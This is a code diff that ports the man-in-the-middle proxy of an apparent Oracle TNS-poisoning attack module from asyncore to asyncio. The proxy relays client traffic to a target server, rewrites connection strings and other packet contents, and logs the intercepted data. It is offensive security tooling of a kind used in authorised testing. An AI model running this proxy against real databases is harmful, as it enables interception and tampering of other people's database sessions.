@@ -1,168 +1,12 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-import logging, socket, asyncore, re
+import logging, socket, asyncio, re
 from threading import Thread
 from time import sleep
 from Tnscmd import Tnscmd
 from Utils import checkOptionsGivenByTheUser
 from Constants import *
-
-class forwarder(asyncore.dispatcher):
-	'''
-	From http://seclists.org/fulldisclosure/2012/Apr/204
-	'''
-	def __init__(self, ip, port, args, connectionString, replaceStr, backlog=5):
-		self.args=args
-		asyncore.dispatcher.__init__(self)
-		self.remoteip=self.args['server']
-		self.remoteport=self.args['port']
-		self.create_socket(socket.AF_INET,socket.SOCK_STREAM)
-		self.set_reuse_addr()
-		self.bind((ip,port))
-		self.listen(backlog)
-		self.connectionString = connectionString
-		self.replaceStr = replaceStr
-
-	def handle_accept(self):
-		'''
-		Called on listening channels (passive openers) when a connection can be established with a new remote endpoint that has issued a connect() call for the local endpoint.
-		'''
-		conn, addr = self.accept()
-		sender(receiver(conn, self.args, self.connectionString, self.replaceStr), self.args)
-
-class receiver(asyncore.dispatcher):
-	'''
-	From http://seclists.org/fulldisclosure/2012/Apr/204
-	'''
-	GOOD_CONNECTION_STRING_TNSPOISON = "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME={0})(CID=(PROGRAM=sqlplus@pc)(HOST=pc)(USER=pc)))(ADDRESS=(PROTOCOL=TCP)(HOST={1})(PORT={2})))"#{0} SID, {1} TARGET, {2} port
-	
-	def __init__(self, conn, args, connectionString, replaceStr):
-		self.peerIP, self.peerPort = conn.getpeername()
-		asyncore.dispatcher.__init__(self,conn)
-		self.from_remote_buffer=b''
-		self.to_remote_buffer=b''
-		self.sender=None
-		self.nbRcvd = 0
-		self.nbSent = 0
-		self.args=args
-		self.connectionString = connectionString
-		self.replaceStr = replaceStr
-
-	def handle_connect(self):
-		'''
-		Called when the active opener’s socket actually makes a connection.
-		'''
-		pass
-
-	def handle_read(self):
-		'''
-		Called when the asynchronous loop detects that a read() call on the channel’s socket will succeed.
-		'''
-		userConnectionString, newConnectionString, printableData = "", "", ""
-		read = self.recv(4096)
-		if self.replaceStr != [None, None]:
-			if self.replaceStr[0] in read:
-				logging.debug('{0} is in the packet received. This string is replacing by {1}'.format(repr(self.replaceStr[0]), repr(self.replaceStr[1])))
-				read = read.replace(self.replaceStr[0], self.replaceStr[1])
-			else:
-				logging.debug('Your string {0} is not in the packet received.'.format(repr(self.replaceStr[0])))
-		if self.nbRcvd == 0 and len(self.args['sid']) in [9,10,11,12]:
-			logging.debug('SID >= 9. Consequently, we need modify the Connection String in the first packet of a communication.')
-			searchCS = re.search('\(DESCRIPTION(.*)\)$',read)
-			if searchCS == None:
-				logging.debug('Connection String was not found in this first packet: anomalous. No aletration of this packet')
-			else:
-				userConnectionString = read[searchCS.start():]
-				logging.debug('Connection String detected in this packet: {0}'.format(repr(userConnectionString)))
-				if self.connectionString == None :
-					logging.debug('A generic Connection String is used')
-					newConnectionString = self.GOOD_CONNECTION_STRING_TNSPOISON.format(self.args['sid'], self.args['server'], self.args['port'])
-				else:
-					logging.debug('Your Connection String will be used in the connection of the Oracle client')
-					newConnectionString = self.connectionString
-				logging.debug('The following connection string will be used: {0}'.format(newConnectionString))
-				read = read.replace(userConnectionString, newConnectionString.ljust(len(userConnectionString),' '))
-				logging.debug('New connection string used: {0}'.format(repr(newConnectionString)))
-		self.from_remote_buffer += read
-		self.nbRcvd += 1
-		if self.args['no-color'] == True :
-			printableData = repr(read)
-		else :
-			printableData = self.args['print'].getColoredString(repr(read), 'green')
-		print("[{0}|{1}:{2}-->] {3}".format(str(self.nbRcvd).zfill(4), self.peerIP, self.peerPort, printableData))
-		
-
-	def writable(self):
-		'''
-		Called each time around the asynchronous loop to determine whether a channel’s socket should be added to the list on which write events can occur.
-		'''
-		return (len(self.to_remote_buffer) > 0)
-
-	def handle_write(self):
-		'''
-		Called when the asynchronous loop detects that a writable socket can be written.
-		'''
-		sent = self.send(self.to_remote_buffer) #Send data to the remote end-point of the socket.
-		printableData = ""
-		if self.args['no-color'] == True : printableData = repr(self.to_remote_buffer)
-		else : printableData = self.args['print'].getColoredString(repr(self.to_remote_buffer), 'blue')
-		print("[{0}|{1}:{2}<--] {3}".format(str(self.nbSent).zfill(4), self.peerIP, self.peerPort, printableData))
-		self.to_remote_buffer = self.to_remote_buffer[sent:]
-		self.nbSent += 1
-
-	def handle_close(self):
-		'''
-		Called when the socket is closed.
-		'''
-		self.close()
-		if self.sender:
-			self.sender.close()
-
-class sender(asyncore.dispatcher):
-	'''
-	From http://seclists.org/fulldisclosure/2012/Apr/204
-	'''
-	def __init__(self, receiver, args):
-		self.args=args
-		asyncore.dispatcher.__init__(self)
-		self.receiver=receiver
-		receiver.sender=self
-		self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.connect((self.args['server'], self.args['port']))
-
-	def handle_connect(self):
-		'''
-		Called when the active opener’s socket actually makes a connection.
-		'''
-		pass
-
-	def handle_read(self):
-		'''
-		Called when the asynchronous loop detects that a read() call on the channel’s socket will succeed.
-		'''
-		read = self.recv(4096)
-		self.receiver.to_remote_buffer += read
-
-	def writable(self):
-		'''
-		Called each time around the asynchronous loop to determine whether a channel’s socket should be added to the list on which write events can occur.
-		'''
-		return (len(self.receiver.from_remote_buffer) > 0)
-
-	def handle_write(self):
-		'''
-		Called when the asynchronous loop detects that a writable socket can be written.
-		'''
-		sent = self.send(self.receiver.from_remote_buffer) #Send data to the remote end-point of the socket.
-		self.receiver.from_remote_buffer = self.receiver.from_remote_buffer[sent:]
-
-	def handle_close(self):
-		'''
-		Called when the socket is closed.
-		'''
-		self.close()
-		self.receiver.close()
 
 class Tnspoison (Tnscmd):
 	'''
@@ -197,6 +41,7 @@ class Tnspoison (Tnscmd):
 	DEFAULT_SID_PACKET_TNSPOISON_SID_11 = b"orcl1234567"
 	DEFAULT_SID_PACKET_TNSPOISON_SID_12 = b"orcl12345678"
 	GOOD_STRINGS_IN_TNS_POISON_RESPONSE = [b'XDB',b'xdb']
+	GOOD_CONNECTION_STRING_TNSPOISON = "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME={0})(CID=(PROGRAM=sqlplus@pc)(HOST=pc)(USER=pc)))(ADDRESS=(PROTOCOL=TCP)(HOST={1})(PORT={2})))"#{0} SID, {1} TARGET, {2} port
 	
 	def __init__(self,args):
 		'''
@@ -302,8 +147,124 @@ class Tnspoison (Tnscmd):
 		'''
 		'''
 		logging.debug("The local proxy will listening on {0}:{1} and it will redirecto traffic to {2}:{3}".format(localIp, localPort, self.args['server'], self.args['port']))
-		forwarder(ip=localIp, port=localPort, args=self.args, connectionString=connectionString, replaceStr=replaceStr)
-		asyncore.loop()
+		asyncio.run(self.__startProxyAsync__(localIp, localPort, connectionString, replaceStr))
+
+	async def __startProxyAsync__(self, localIp, localPort, connectionString=None, replaceStr=[None, None]):
+		'''
+		Async entry point: starts an asyncio TCP server that proxies connections.
+		'''
+		self._tnsConnectionString = connectionString
+		self._tnsReplaceStr = replaceStr
+		server = await asyncio.start_server(
+			lambda r, w: self.__handle_client__(r, w),
+			localIp, localPort)
+		async with server:
+			await server.serve_forever()
+
+	async def __handle_client__(self, client_reader, client_writer):
+		'''
+		Handles a single proxied client connection: receives traffic from the
+		Oracle client, optionally modifies TNS packets, and forwards to the
+		real Oracle server. Responses are relayed back to the client.
+		'''
+		peerIP, peerPort = client_writer.getpeername()
+		nbRcvd = 0
+		nbSent = 0
+		try:
+			server_reader, server_writer = await asyncio.open_connection(
+				self.args['server'], self.args['port'])
+		except asyncio.CancelledError:
+			raise
+		except Exception as e:
+			logging.error("Failed to connect to {0}:{1}: {2}".format(
+				self.args['server'], self.args['port'], e))
+			client_writer.close()
+			await client_writer.wait_closed()
+			return
+
+		async def client_to_server():
+			nonlocal nbRcvd
+			try:
+				while True:
+					data = await client_reader.read(4096)
+					if not data:
+						break
+					read = data
+					if self._tnsReplaceStr != [None, None]:
+						if self._tnsReplaceStr[0] in read:
+							logging.debug('{0} is in the packet received. This string is replacing by {1}'.format(repr(self._tnsReplaceStr[0]), repr(self._tnsReplaceStr[1])))
+							read = read.replace(self._tnsReplaceStr[0], self._tnsReplaceStr[1])
+						else:
+							logging.debug('Your string {0} is not in the packet received.'.format(repr(self._tnsReplaceStr[0])))
+					if nbRcvd == 0 and len(self.args['sid']) in [9,10,11,12]:
+						logging.debug('SID >= 9. Consequently, we need modify the Connection String in the first packet of a communication.')
+						searchCS = re.search(r'\(DESCRIPTION(.*)\)$', read)
+						if searchCS == None:
+							logging.debug('Connection String was not found in this first packet: anomalous. No aletration of this packet')
+						else:
+							userConnectionString = read[searchCS.start():]
+							logging.debug('Connection String detected in this packet: {0}'.format(repr(userConnectionString)))
+							if self._tnsConnectionString == None:
+								logging.debug('A generic Connection String is used')
+								newConnectionString = self.GOOD_CONNECTION_STRING_TNSPOISON.format(self.args['sid'], self.args['server'], self.args['port'])
+							else:
+								logging.debug('Your Connection String will be used in the connection of the Oracle client')
+								newConnectionString = self._tnsConnectionString
+							logging.debug('The following connection string will be used: {0}'.format(newConnectionString))
+							read = read.replace(userConnectionString, newConnectionString.ljust(len(userConnectionString), ' '))
+							logging.debug('New connection string used: {0}'.format(repr(newConnectionString)))
+					nbRcvd += 1
+					if self.args['no-color'] == True:
+						printableData = repr(read)
+					else:
+						printableData = self.args['print'].getColoredString(repr(read), 'green')
+					print("[{0}|{1}:{2}-->] {3}".format(str(nbRcvd).zfill(4), peerIP, peerPort, printableData))
+					server_writer.write(read)
+					await server_writer.drain()
+			except asyncio.CancelledError:
+				raise
+			except Exception:
+				pass
+			finally:
+				if not server_writer.is_closing():
+					server_writer.close()
+
+		async def server_to_client():
+			nonlocal nbSent
+			try:
+				while True:
+					data = await server_reader.read(4096)
+					if not data:
+						break
+					if self.args['no-color'] == True:
+						printableData = repr(data)
+					else:
+						printableData = self.args['print'].getColoredString(repr(data), 'blue')
+					print("[{0}|{1}:{2}<--] {3}".format(str(nbSent).zfill(4), peerIP, peerPort, printableData))
+					nbSent += 1
+					client_writer.write(data)
+					await client_writer.drain()
+			except asyncio.CancelledError:
+				raise
+			except Exception:
+				pass
+			finally:
+				if not client_writer.is_closing():
+					client_writer.close()
+
+		try:
+			await asyncio.gather(client_to_server(), server_to_client())
+		except asyncio.CancelledError:
+			pass
+		finally:
+			for w in (client_writer, server_writer):
+				if not w.is_closing():
+					w.close()
+			await asyncio.gather(
+				client_writer.wait_closed(),
+				server_writer.wait_closed(),
+				return_exceptions=True
+			)
 		
 	
 	def exploitTNSPoisoningAttack (self, checkOnly=False):
